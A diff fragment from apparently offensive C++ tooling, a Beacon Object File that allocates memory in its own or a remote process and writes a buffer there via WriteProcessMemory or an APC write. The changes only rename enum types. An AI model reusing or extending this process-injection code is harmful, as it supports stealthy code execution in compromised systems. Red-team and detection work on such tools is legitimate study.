@@ -19,9 +19,9 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     BOOL   Success  = FALSE;
 
     if ( ProcessID == HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess ) ) {
-        if ( AllocMtd == Alloc::Default ) {
+        if ( AllocMtd == Alloc::Type::Default ) {
             VmBase = VirtualAlloc( nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
-        } else if ( AllocMtd == Alloc::Drip ) {
+        } else if ( AllocMtd == Alloc::Type::Drip ) {
             // VmBase = BeaconDripAlloc
         }
 
@@ -45,9 +45,9 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
             BeaconPrintf( CALLBACK_ERROR, "[x] Failure to open target process handle: %d\n", GetLastError() ); return;
         }
 
-        if ( AllocMtd == Alloc::Default ) {
+        if ( AllocMtd == Alloc::Type::Default ) {
             VmBase = VirtualAllocEx( Handle, nullptr, Length, MEM_COMMIT, PAGE_READWRITE );
-        } else if ( AllocMtd == Alloc::Drip ) {
+        } else if ( AllocMtd == Alloc::Type::Drip ) {
             // VmBase = BeaconDripAlloc
         }
         
@@ -55,12 +55,12 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
             BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory allocation: %d\n", GetLastError() ); return;
         }
 
-        if ( WriteMtd == Write::Default ) {
+        if ( WriteMtd == Write::Type::Default ) {
             Success = WriteProcessMemory( Handle, VmBase, Buffer, Length, 0 );
             if ( ! Success ) {
                 BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory write: %d\n", GetLastError() ); return;
             }
-        } else if ( WriteMtd == Write::Apc ) {
+        } else if ( WriteMtd == Write::Type::Apc ) {
             Success = BeaconWriteApc( Handle, VmBase, Buffer, Length );
             if ( ! Success ) {
                 BeaconPrintf( CALLBACK_ERROR, "[x] Failure in memory write: %d\n", GetLastError() ); return;
